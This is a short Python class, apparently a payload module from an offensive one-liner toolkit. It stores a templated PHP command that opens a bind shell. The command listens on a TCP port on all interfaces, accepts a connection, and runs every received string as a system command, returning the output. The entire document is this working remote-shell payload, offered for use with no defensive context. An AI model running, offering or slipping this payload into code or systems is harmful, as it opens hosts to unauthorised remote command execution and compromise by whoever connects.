class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses PHP sockets to establish a bind shell."
    function    = "bind shell"
    liner       = """php -r '$VAR1=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($VAR1,"0.0.0.0",PORT);socket_listen($VAR1,1);$VAR2=socket_accept($VAR1);while(NUM1){if(!socket_write($VAR2,"$ ",2))exit;$VAR3=socket_read($VAR2,100);$VAR4=popen("$VAR3","r");while(!feof($VAR4)){$VAR5=fgetc($VAR4);socket_write($VAR2,$VAR5,strlen($VAR5));}}'"""
